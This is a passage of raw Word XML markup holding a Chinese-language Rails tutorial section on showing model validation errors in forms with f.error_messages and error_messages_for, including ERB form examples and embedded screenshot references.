          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>error_messages_for</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DDDD62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当使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>form_for</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> helper 来创建表单的时候，你可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>error_messages</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法在表单上显示当前模型实例的所有校验后的错误信息。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7776"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="58F7F48C" w14:textId="77777777" w:rsidTr="00AA0A9B">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="226E0ED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Product &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="733CBC3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:description, :value,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7C0DE0A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:value, :numericality</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 :allow_nil</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3B70299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r w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="537ECEAD" w14:textId="77777777" w:rsidTr="00AA0A9B">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3B6D7A4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&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>form_for(@product) do</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|f| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71F899F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9408CF">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="009408CF">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="009408CF">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>f.error_messages %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6938281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&lt;p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A68038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&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>f.label :description</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>%&gt;&lt;br</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>/&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="735B485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&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>f.text_field :description</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FF2778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&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63E0A57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&lt;p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C380F1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&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>f.label :value</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>%&gt;&lt;br</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>/&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DA77E7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&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>f.text_field :value</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DAB229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&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="195A339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&lt;p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="347A586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&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>f.submit "Create"</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="549DA5B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&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EEADF2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&lt;%</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="42CBACF2"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如果你提交了一个空表单，结果会如下图显示的一样：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB6A18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0BA7312B" wp14:editId="281604AE">
            <wp:extent cx="4143375" cy="3829050"/>
            <wp:effectExtent l="19050" t="0" r="9525" b="0"/>
            <wp:docPr id="7" name="图片 4" descr="Error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ror messages"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId201" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4143375" cy="3829050"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B60455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产生的 HTML 可能会和上图显示的不太一样，除非你是使用脚手架来生成代码的。参考 </w:t>
      </w:r>
      <w:hyperlink r:id="rId202" w:anchor="customizing-error-messages-css" w:history="1">
        <w:r w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Customizing the Error Messages CSS</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6750C709"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你同样可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>error_messages_for</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> helper 来在视图模板中显示和模型相关的错误信息。如下面所示，我们可以获得和前面例子几乎相同的效果。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4296"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="493EDA83" w14:textId="77777777" w:rsidTr="009408CF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="20F09989" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="307171334"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>error_messages_for :product</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0B51A0D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显示出的错误信息总是以首字母大写的属性名为前缀，而后才是错误信息本身的内容。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55943C5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form.error_messages</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>error_messages_for</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法都可以接受参数以定制用来显示错误信息的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>div</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 元素，改变 header 的文字，改变 header 下的信息，我们甚至可以指定 header 元素使用的 HTML 标签。例如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7296"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="1EFE6390" w14:textId="77777777" w:rsidTr="009408CF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="32DC709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&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>f.error_messages :header_message</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "Invalid product!",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DD8ECA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:message</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "You'll need to fix the following fields:",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15FCD18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252018">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:header_tag</w:t>
            </w:r>
            <w:r w:rsidRPr="00252018">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00252018">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; :h3</w:t>
            </w:r>
            <w:r w:rsidRPr="00252018">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00252018">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="203E3E0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结果如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EDEDE5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6FBE5AAE" wp14:editId="74A9AC62">
            <wp:extent cx="4105275" cy="2038350"/>
            <wp:effectExtent l="19050" t="0" r="9525" b="0"/>
            <wp:docPr id="5" name="图片 5" descr="Customized error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ized error messages"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId203" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4105275" cy="2038350"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1704D892"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但是</w:t>
      </w:r>
      <w:r w:rsidRPr="00E62DCB">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
